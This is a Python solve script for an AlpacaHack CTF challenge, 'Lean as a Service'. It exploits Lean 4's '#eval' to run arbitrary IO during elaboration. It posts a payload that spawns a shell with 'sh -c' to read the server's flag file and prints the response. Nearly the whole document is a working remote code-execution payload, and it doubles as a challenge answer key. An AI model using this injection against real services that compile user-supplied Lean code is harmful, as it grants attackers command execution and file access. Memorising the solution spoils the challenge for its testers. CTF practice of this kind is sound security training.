#!/usr/bin/env python3
"""
Lean as a Service - AlpacaHack Daily (Misc, Medium)

The server runs `lean Main.lean` on user-supplied source. Lean 4 evaluates
`#eval` expressions at elaboration time, and those may run arbitrary IO,
including spawning a shell. So "only verifies proofs" is false: we read the
flag file (/flag-<md5>.txt) during elaboration and print it to stdout, which
the app echoes back in its result box.
"""
import sys
import urllib.parse
import urllib.request

# The challenge server URL printed by "Spawn Challenge Server" (host:port).
BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

PAYLOAD = r'''
#eval do
  let out ← IO.Process.run { cmd := "sh", args := #["-c", "cat /flag-*.txt"] }
  IO.print out
'''

data = urllib.parse.urlencode({"source": PAYLOAD}).encode()
req = urllib.request.Request(BASE.rstrip("/") + "/", data=data)
with urllib.request.urlopen(req, timeout=30) as resp:
    body = resp.read().decode()

print(body)
